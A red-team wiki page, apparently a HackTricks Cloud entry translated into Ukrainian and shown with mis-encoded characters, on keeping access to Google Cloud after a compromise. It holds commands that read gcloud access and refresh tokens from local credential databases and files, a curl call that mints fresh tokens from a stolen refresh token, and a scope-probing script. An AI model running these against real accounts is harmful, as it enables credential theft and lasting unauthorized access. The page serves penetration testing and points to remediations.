# GCP - Non-svc Persistance

{% hint style="success" %}
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –ø–æ–¥–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}

–¶–µ –∫–æ—Ä–∏—Å–Ω—ñ —Ç–µ—Ö–Ω—ñ–∫–∏, –∫–æ–ª–∏ –≤–∏ —è–∫–∏–º–æ—Å—å —á–∏–Ω–æ–º —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞–ª–∏ –¥–µ—è–∫—ñ GCP –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –∞–±–æ –º–∞—à–∏–Ω—É, —â–æ –ø—Ä–∞—Ü—é—î –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ GCP.

## Token Hijacking

### Authenticated User Tokens

–©–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ **–ø–æ—Ç–æ—á–Ω–∏–π —Ç–æ–∫–µ–Ω** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏:

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
{% endcode %}

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞ —Ü—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ, —è–∫ **–±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ–π —Ç–æ–∫–µ–Ω –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é gcloud**:

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#id-6440-1" %}

–©–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–µ—Ç–∞–ª—ñ –¥–ª—è **–≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó –Ω–æ–≤–æ–≥–æ access token**, –≤–∏–∫–æ–Ω–∞–π—Ç–µ:

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
{% endcode %}

–¢–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ refresh tokens —É **`$HOME/.config/gcloud/application_default_credentials.json`** —Ç–∞ —É **`$HOME/.config/gcloud/legacy_credentials/*/adc.json`**.

–©–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –Ω–æ–≤–∏–π –æ–Ω–æ–≤–ª–µ–Ω–∏–π access token –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **refresh token**, client ID —Ç–∞ client secret, –≤–∏–∫–æ–Ω–∞–π—Ç–µ:

{% code overflow="wrap" %}
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
{% endcode %}

–¢–µ—Ä–º—ñ–Ω –¥—ñ—ó refresh tokens –º–æ–∂–Ω–∞ –∫–µ—Ä—É–≤–∞—Ç–∏ –≤ **Admin** > **Security** > **Google Cloud session control**, —ñ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤—ñ–Ω –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–π –Ω–∞ 16 –≥–æ–¥–∏–Ω, —Ö–æ—á–∞ –π–æ–≥–æ –º–æ–∂–Ω–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ —Ç–∞–∫, —â–æ–± –≤—ñ–Ω –Ω—ñ–∫–æ–ª–∏ –Ω–µ –∑–∞–∫—ñ–Ω—á—É–≤–∞–≤—Å—è:

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### Auth flow

–ü—Ä–æ—Ü–µ—Å –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –ø—Ä–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ —á–æ–≥–æ—Å—å –Ω–∞ –∫—à—Ç–∞–ª—Ç `gcloud auth login` –≤—ñ–¥–∫—Ä–∏—î –∑–∞–ø–∏—Ç —É –±—Ä–∞—É–∑–µ—Ä—ñ, —ñ –ø—ñ—Å–ª—è –ø—Ä–∏–π–Ω—è—Ç—Ç—è –≤—Å—ñ—Ö scopes –±—Ä–∞—É–∑–µ—Ä –Ω–∞–¥—ñ—à–ª–µ –∑–∞–ø–∏—Ç, –ø–æ–¥—ñ–±–Ω–∏–π –¥–æ —Ü—å–æ–≥–æ, –Ω–∞ http –ø–æ—Ä—Ç, –≤—ñ–¥–∫—Ä–∏—Ç–∏–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–º:
```
/?state=EN5AK1GxwrEKgKog9ANBm0qDwWByYO&code=4/0AeaYSHCllDzZCAt2IlNWjMHqr4XKOuNuhOL-TM541gv-F6WOUsbwXiUgMYvo4Fg0NGzV9A&scope=email%20openid%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/cloud-platform%20https://www.googleapis.com/auth/appengine.admin%20https://www.googleapis.com/auth/sqlservice.login%20https://www.googleapis.com/auth/compute%20https://www.googleapis.com/auth/accounts.reauth&authuser=0&prompt=consent HTTP/1.1
```
Then, gcloud –±—É–¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Å—Ç–∞–Ω —ñ –∫–æ–¥ –∑ –¥–µ—è–∫–∏–º –∂–æ—Ä—Å—Ç–∫–æ –∑–∞–∫–æ–¥–æ–≤–∞–Ω–∏–º `client_id` (`32555940559.apps.googleusercontent.com`) —ñ **`client_secret`** (`ZmssLNjJy2998hD4CTg2ejr2`), —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ **–æ—Å—Ç–∞—Ç–æ—á–Ω—ñ –¥–∞–Ω—ñ —Ç–æ–∫–µ–Ω–∞ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è**.

{% hint style="danger" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –∑–≤'—è–∑–æ–∫ –∑ localhost –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è —á–µ—Ä–µ–∑ HTTP, —Ç–æ–º—É –º–æ–∂–ª–∏–≤–æ –ø–µ—Ä–µ—Ö–æ–ø–∏—Ç–∏ –¥–∞–Ω—ñ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —Ç–æ–∫–µ–Ω–∞ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è, –æ–¥–Ω–∞–∫ —Ü—ñ –¥–∞–Ω—ñ –¥—ñ–π—Å–Ω—ñ –ª–∏—à–µ –æ–¥–∏–Ω —Ä–∞–∑, —Ç–æ–º—É —Ü–µ –±—É–¥–µ –º–∞—Ä–Ω–æ, –ª–µ–≥—à–µ –ø—Ä–æ—Å—Ç–æ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ —Ç–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –∑ —Ñ–∞–π–ª—É.
{% endhint %}

### OAuth Scopes

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –≤—Å—ñ Google scopes –Ω–∞ [https://developers.google.com/identity/protocols/oauth2/scopes](https://developers.google.com/identity/protocols/oauth2/scopes) –∞–±–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ —ó—Ö, –≤–∏–∫–æ–Ω–∞–≤—à–∏:

{% code overflow="wrap" %}
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-A/\-\._]*' | sort -u
```
{% endcode %}

–ú–æ–∂–Ω–∞ –ø–æ–±–∞—á–∏—Ç–∏, —è–∫—ñ –æ–±–ª–∞—Å—Ç—ñ –∑–∞—Å—Ç–æ—Å—É–≤–∞–Ω–Ω—è, —â–æ **`gcloud`** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –¥–ª—è –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, –º–æ–∂–µ –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ü—å–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞:
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope         \r"
if ! curl -v "https://accounts.google.com/o/oauth2/auth?response_type=code&client_id=32555940559.apps.googleusercontent.com&redirect_uri=http%3A%2F%2Flocalhost%3A8085%2F&scope=openid+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcloud-platform+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fappengine.admin+$scope+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fsqlservice.login+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcompute+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Faccounts.reauth&state=AjvFqBW5XNIw3VADagy5pvUSPraLQu&access_type=offline&code_challenge=IOk5F08WLn5xYPGRAHP9CTGHbLFDUElsP551ni2leN4&code_challenge_method=S256" 2>&1 | grep -q "error"; then
echo ""
echo $scope
fi
done
```
–ü—ñ—Å–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –±—É–ª–æ –ø–µ—Ä–µ–≤—ñ—Ä–µ–Ω–æ, —â–æ —Ü–µ–π –¥–æ–¥–∞—Ç–æ–∫ –ø—ñ–¥—Ç—Ä–∏–º—É—î —Ü—ñ –æ–±–ª–∞—Å—Ç—ñ:
```
https://www.googleapis.com/auth/appengine.admin
https://www.googleapis.com/auth/bigquery
https://www.googleapis.com/auth/cloud-platform
https://www.googleapis.com/auth/compute
https://www.googleapis.com/auth/devstorage.full_control
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/userinfo.email
```
–¶—ñ–∫–∞–≤–æ –±–∞—á–∏—Ç–∏, —è–∫ —Ü–µ–π –¥–æ–¥–∞—Ç–æ–∫ –ø—ñ–¥—Ç—Ä–∏–º—É—î **`drive`** scope, —â–æ –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó –∑ GCP –¥–æ Workspace, —è–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º–æ–∂–µ –∑–º—É—Å–∏—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ —Ç–æ–∫–µ–Ω –∑ —Ü–∏–º scope.

**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —è–∫** [**–∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º —Ç—É—Ç**](../gcp-to-workspace-pivoting/#abusing-gcloud)**.**

### Service Accounts

–¢–∞–∫ —Å–∞–º–æ, —è–∫ —ñ –∑ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–º–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏, —è–∫—â–æ –≤–∞–º –≤–¥–∞—Å—Ç—å—Å—è **—Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ —Ñ–∞–π–ª –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞** —Å–µ—Ä–≤—ñ—Å–Ω–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É, –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –Ω—å–æ–≥–æ –∑–∞–∑–≤–∏—á–∞–π —Å—Ç—ñ–ª—å–∫–∏, —Å–∫—ñ–ª—å–∫–∏ –∑–∞—Ö–æ—á–µ—Ç–µ**.\
–û–¥–Ω–∞–∫, —è–∫—â–æ –≤–∏ –≤–∫—Ä–∞–¥–µ—Ç–µ **OAuth —Ç–æ–∫–µ–Ω** —Å–µ—Ä–≤—ñ—Å–Ω–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É, —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ —â–µ —Ü—ñ–∫–∞–≤—ñ—à–µ, —Ç–æ–º—É —â–æ, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —Ü—ñ —Ç–æ–∫–µ–Ω–∏ –∫–æ—Ä–∏—Å–Ω—ñ –ª–∏—à–µ –ø—Ä–æ—Ç—è–≥–æ–º –≥–æ–¥–∏–Ω–∏, —è–∫—â–æ **–∂–µ—Ä—Ç–≤–∞ –≤–∏–¥–∞–ª–∏—Ç—å –ø—Ä–∏–≤–∞—Ç–Ω–∏–π api –∫–ª—é—á, OAuth —Ç–æ–∫–µ–Ω –≤—Å–µ –æ–¥–Ω–æ –±—É–¥–µ –¥—ñ–π—Å–Ω–∏–º –¥–æ –π–æ–≥–æ –∑–∞–∫—ñ–Ω—á–µ–Ω–Ω—è —Ç–µ—Ä–º—ñ–Ω—É –¥—ñ—ó**.

### Metadata

–û—á–µ–≤–∏–¥–Ω–æ, –ø–æ–∫–∏ –≤–∏ –∑–Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –º–∞—à–∏–Ω–∏, —â–æ –ø—Ä–∞—Ü—é—î –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ GCP, –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Å–µ—Ä–≤—ñ—Å–Ω–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É, –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–æ–≥–æ –¥–æ —Ü—ñ—î—ó –º–∞—à–∏–Ω–∏, –∑–≤–µ—Ä–Ω—É–≤—à–∏—Å—å –¥–æ –º–µ—Ç–∞–¥–∞–Ω–∏—Ö** (–∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ OAuth —Ç–æ–∫–µ–Ω–∏, –¥–æ —è–∫–∏—Ö –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø —É —Ü—ñ–π —Ç–æ—á—Ü—ñ, –∑–∞–∑–≤–∏—á–∞–π –æ–±–º–µ–∂–µ–Ω—ñ scope).

### Remediations

–î–µ—è–∫—ñ –∑–∞—Ö–æ–¥–∏ —â–æ–¥–æ —É—Å—É–Ω–µ–Ω–Ω—è —Ü–∏—Ö —Ç–µ—Ö–Ω—ñ–∫ –ø–æ—è—Å–Ω–µ–Ω—ñ –≤ [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

## References

* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ —É **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –ø–æ–¥–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
{% endhint %}
